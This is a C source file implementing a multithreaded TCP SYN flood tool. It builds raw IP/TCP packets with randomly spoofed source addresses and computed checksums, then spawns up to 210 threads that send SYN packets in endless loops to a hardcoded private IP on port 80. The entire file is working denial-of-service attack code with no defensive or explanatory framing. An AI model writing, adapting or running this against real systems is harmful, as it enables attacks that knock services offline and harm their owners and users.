#include <stdint.h>
#include <sys/wait.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define MAX_T 210
pthread_mutex_t mutex;
int n_threads = 0;

// https://github.com/Hypro999/synflood.c/blob/master/src/utils.c#L181

typedef struct {
  unsigned long saddr;     
  unsigned long daddr;     
  unsigned char  rsvd;     
  unsigned char  proto;    
  unsigned short seglen;   
  struct tcphdr thdr; 
} tcpTempHead;

unsigned short randPort(){
	return	(random() % (65535 - 32768 + 1)) + 32768;
}

in_addr_t randIP(){
	char ret[17];

	sprintf(ret, "%u.%u.%u.%u", rand()%256, rand()%256, rand()%256, rand()%256);

	return inet_addr(ret);
}

void setHead_ip(struct iphdr *ip_headers, struct in_addr *hin_addr) {
	ip_headers->ihl = 0x5;
	ip_headers->version = 0x4;
	ip_headers->tos = 0x00;
	ip_headers->tot_len = 0x00;
	ip_headers->id = 0x00;
	ip_headers->frag_off = 0x0040;
	ip_headers->ttl = 0x40;
	ip_headers->protocol = 0x06;
	ip_headers->check = 0x0000;
	ip_headers->saddr = randIP();
	ip_headers->daddr = hin_addr->s_addr;
}

void setHead_tcp(struct tcphdr *tcp_headers, in_port_t port) {
	tcp_headers->th_ack = 0x0000;
	tcp_headers->th_x2 = 0x0;
	tcp_headers->th_off = 0x5;
	tcp_headers->th_win = htons(64240);
	tcp_headers->th_sum = 0x00;  
	tcp_headers->th_urp = 0x00;
	tcp_headers->th_flags = TH_SYN;
	tcp_headers->th_sport = htons(randPort());
	tcp_headers->th_dport = port;
	tcp_headers->th_seq = htonl(random());
}

unsigned short tcpChecksum(struct iphdr *ip_headers, struct tcphdr *tcp_headers) {

	unsigned short chksum_buffer[sizeof(tcpTempHead)];

	tcpTempHead *pheader = (tcpTempHead *) chksum_buffer;
	pheader->saddr = ip_headers->saddr;
	pheader->daddr = ip_headers->daddr;
	pheader->proto = ip_headers->protocol;
	pheader->rsvd = 0x0;
	pheader->seglen = htons(20);
	memcpy(&pheader->thdr, tcp_headers, sizeof(struct tcphdr));

	long chksum = 0;
	unsigned short *ptr = chksum_buffer;
	size_t count = sizeof(tcpTempHead);
	while (count > 1) {
		chksum += *ptr;
		++ptr;
		count -= 2;
	}
	if (count == 1) chksum += *(unsigned char *)ptr;

	chksum = (chksum >> 16) + (chksum & 0xffff);
	chksum = chksum + (chksum >> 16);
	chksum = ~chksum;
	return (unsigned short) chksum;
}

void *tredi(void *args){

	struct sockaddr_in host_addr = *(struct sockaddr_in*)args;

	int sockfd;
	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1){
		perror("socket");
		pthread_mutex_lock(&mutex);
		n_threads--;
		pthread_mutex_unlock(&mutex);
		pthread_exit(NULL);	
	}
	
	unsigned char pack[256];
	struct iphdr *ip_headers = (struct iphdr *) pack;
	struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);

	while(1){
		setHead_ip(ip_headers, &host_addr.sin_addr);
		setHead_tcp(tcp_headers, host_addr.sin_port);
		tcp_headers->th_sum = tcpChecksum(ip_headers, tcp_headers);
		if (sendto(sockfd, pack, 256, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1){
			perror("sendto()");
			pthread_mutex_lock(&mutex);
			n_threads--;
			pthread_mutex_unlock(&mutex);
			pthread_exit(NULL);
		}
		sleep(1);
	}

}

int main(int argc, char *argv[]){
	
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(80);
	addr.sin_addr.s_addr = inet_addr("172.21.209.231");


	pthread_t a;
	while(1){
		if(n_threads < MAX_T){
			pthread_create(&a, NULL, tredi, (void*)&addr);
			pthread_mutex_lock(&mutex);
			n_threads++;
			pthread_mutex_unlock(&mutex);
		} else sleep(2);
	}

	printf("fim\n");
	return 0;
}
